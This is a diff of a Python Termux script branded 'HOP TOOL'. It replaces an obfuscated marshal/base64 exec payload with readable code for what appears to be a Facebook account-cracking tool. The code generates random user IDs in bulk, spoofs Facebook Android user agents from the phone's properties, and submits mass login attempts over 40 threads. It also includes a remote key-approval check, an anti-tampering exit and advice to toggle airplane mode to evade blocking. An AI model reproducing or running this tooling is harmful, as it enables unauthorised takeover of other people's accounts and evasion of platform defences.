@@ -1,5 +1,883 @@
-# Compiled By Mr Mafia | Muhammad Muzammil
-# Github :  https://github.com/Muzammil-404
+from os import path
+import requests,random,uuid,string,hashlib,json
+from os import path
+import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
+from time import localtime as lt
+from urllib.request import urlopen
+import os,base64,zlib,pip,urllib,urllib3
+import platform,math,smtplib
+import platform
+import smtplib
+import math
+import os,base64,zlib,pip,urllib
+first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
+if not 'print' in open(first+'sessions.py','r').read():
+    pass
+else:
+    exit('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')
+def clear():
+        os.system('clear')
+os.system('clear')
+print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE...!\x1b[38;5;244m [\x1b[38;5;46m–\x1b[38;5;244m]\x1b[1;97m')
+time.sleep(3)
+os.system('clear')
+print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m LODING ●\x1b[38;5;47m●\x1b[38;5;48m●\x1b[38;5;49m●\x1b[38;5;50m●\x1b[38;5;244m [\x1b[38;5;46mHOP TOOL\x1b[38;5;244m]\x1b[1;97m')
+time.sleep(2)
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+        os.system('pip install requests futures==2 > /dev/null')
+        os.system('python HOP.py')
+except:pass
+#__________________[ date ]__________________#
+dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
+dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+date = str(tgl)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(bln)+'\x1b[38;5;244m-\x1b[38;5;46m'+str(thn)
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+#__________________| ETC |__________________#
+sim_id = ''
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+fblc = 'en_GB'
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+except:
+        fbcr = 'Zong'
+fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+fbdv = model
+fbsv = android_version
+fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
+fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
+        total = 0
+        for i in fbcr:
+                total+=1
+        select = ('1','2')
+        if select == '1':
+                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+                sim_id+=fbcr
+        elif select == '2':
+                try:
+                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+                        sim_id+=fbcr
+                except Exception as e:
+                        fbcr = "Zong"
+                        sim_id+=fbcr
+        else:
+                fbcr = 'Zong'
+                sim_id+=fbcr
+except:
+        fbcr = "Zong"
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+        'fblc':fblc,
+        'fbmf':fbmf,
+        'fbbd':fbbd,
+        'fbdv':model,
+        'fbsv':fbsv,
+        'fbca':fbca,
+        'fbdm':fbdm}
+#__________________| LOOP |__________________#
+loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];plist = []
+#__________________[ SYS ]__________________#
+sys.stdout.write('\x1b]2; =(💚)-HOP-PRO-(💚)=\x07')
+#__________________| COLOUR |__________________#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
+#__________________| LINE |__________________#
+def clear():os.system('clear');print(logo)
+def linex():print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+#__________________[ M1 ]__________________#
+def HOP_M1():
+        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/61.0.0.6595;FBBV/61279955;[FBAN/FB4A;FBAV/51.0.0.32.36;FBBV/538346501;FBDM/{density=2.3,width=800,height=1280};FBLC/en_ZA;FBRV/597679001;FB_FW/2;FBCR/Damag Syria;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T280;FBSV/5.1.1;FBOP/19;FBCA/arm64-v8a:;]"
+        return ua
+#__________________[ M2 ]__________________#
+def HOP_M2():
+        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/287.0.0.39.77;FBBV/67912209;FBDM/{density=3.9,width=634,height=2906};FBLC/en_US;FBCR/Zong;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920V;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
+        return ua
+#__________________[ M3 ]__________________#
+def HOP_M3():
+        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/61.0.0.6595;FBBV/61279955;[FBAN/FB4A;FBAV/269.0.0.91.157;FBBV/79411970;FBDM/{density=2.6,width=1370,height=2457};FBLC/en_NP;FBRV/69505087;FBCR/NP Nepal;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J510GN;FBSV/9.9;FBOP/19;FBCA/arm64-v8a:;]"
+        return ua
+#-----------------------[ UA-CODE ]-----------------------#
+#old ua def[👇]
+def windows():
+    aV=str(random.choice(range(10,20)))
+    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
+    bV=str(random.choice(range(1,36)))
+    bx=str(random.choice(range(34,38)))
+    bz=f"5{bx}.{bV}"
+    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
+    cV=str(random.choice(range(1,36)))
+    cx=str(random.choice(range(34,38)))
+    cz=f"5{cx}.{cV}"
+    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
+    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
+    return random.choice([A,B,C,D])
+#-------------------// APPROVAL \\---------------------#
+import os,httpx
+sexkey = "HP~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~PRO"
+def approval():
+    sexkey = "HP~("+str(os.getuid())+"=(CYBER)="+str(os.getuid())+")~PRO"
+    ress=httpx.get("https://github.com/Michaelvallecer/approval.txt/blob/main/approval.txt").text
+    if sexkey in ress:
+        menu()
+    else:
+        print("\x1b[38;5;244m KEY IS NOT APPROVED")
+        os.system("clear")
+        print(logo)
+        print("\x1b[38;5;46m < !!...FIRST APPROVE YOUR KEY...!! > ")
+        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+        input(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
+        time.sleep(2)
+        tks = sexkey
+        os.system('xdg-open https://www.facebook.com/marjie.buynay.7')
+#__________________| LOGO |__________________#
+logo=(f"""
+\x1b[1;97m HH   HH   OOOOO   PPPPPP ━┳┳━━━━━━━━━━━━━━━━━━┐
+\x1b[38;5;49m HH   HH  OO   OO  PP   PP ┃                   ┃
+\x1b[38;5;48m HHHHHHH  OO   OO  PPPPPP  ┃  VRSN \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m (\x1b[1;97mV\x1b[38;5;46m/\x1b[1;97m1.1\x1b[38;5;244m)\x1b[38;5;48m  ┃
+\x1b[38;5;47m HH   HH  OO   OO  PP      ┃                   ┃
+\x1b[1;97m HH   HH   OOOO0   PP ━━━━┻┻━━━━━━━━━━━━━━━━━━━┘
+\x1b[1;97m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐\033[1;37m
+\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m ANOTHER  \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mSHADIN AFRIDI\x1b[38;5;244m] \x1b[1;97m              ┃
+\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m FACEBOOK \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mMD SHADIN AFRIDI\x1b[38;5;244m] \x1b[1;97m           ┃
+\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m TOOLTYPE \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mPAID\x1b[38;5;244m]\x1b[1;97mx\x1b[38;5;244m[\x1b[38;5;46mFILE\x1b[1;97m┼\x1b[38;5;46mRANDOM\x1b[1;97m┼\x1b[38;5;46mOLD\x1b[38;5;244m] \x1b[1;97m     ┃
+\x1b[1;97m┃\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m┃
+\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m KEY ━\x1b[38;5;244m➤ \x1b[38;5;81m{sexkey}      \x1b[1;97m┃
+\x1b[1;97m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\033[1;37m""")
+#-----------------------[ OLD-CODE ]-----------------------#
+def _old_():
+       user=[]
+       clear()
+       print(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()
+       limit=input(f"\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
+       clear()
+       print(f'\x1b[38;5;244m(\x1b[1;97m1\x1b[38;5;244m) \x1b[38;5;46mMETHOD \x1b[38;5;244m(\x1b[38;5;46m2009-2014\x1b[38;5;244m) \x1b[38;5;46m')
+       linex()
+       ask=input(f"\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
+       if ask in["1"]:
+          star="10000"
+          for i in range(int(limit)):
+              data=str(random.choice(range(1000000000,9999999999)))
+              user.append(data)
+       else:
+        star="100000"
+        for i in range(int(limit)):
+            data=str(random.choice(range(100000000,999999999)))
+            user.append(data)
+    
+       with tred(max_workers=40) as crack_submit:
+           clear()
+           print(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m–\x1b[38;5;46m➤{A} {limit} \x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m–\x1b[38;5;46m➤ {A}M{ask}')
+           print(f'\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE');linex()
+           for mal in user:
+              uid=star+mal
+              crack_submit.submit(login,uid)
+    
+loop=0
+oks=[]
+cps=[]
 
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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